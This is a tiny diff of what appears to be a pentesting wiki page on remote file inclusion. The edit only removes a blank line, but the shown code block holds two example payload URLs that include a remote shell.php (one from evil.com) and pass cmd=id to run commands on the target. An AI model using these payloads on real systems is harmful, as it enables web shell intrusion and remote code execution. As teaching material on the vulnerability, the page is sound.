@@ -89,7 +89,6 @@ In most languages, including remote URLs is considered as a dangerous practice a
 {% code overflow="wrap" %}
 ```bash
 http://target.com/index.php?page=ftp://user:pass@localhost/shell.php&cmd=id
-
 http://target.com/index.php?page=http://evil.com/shell.php&cmd=id
 ```
 {% endcode %}
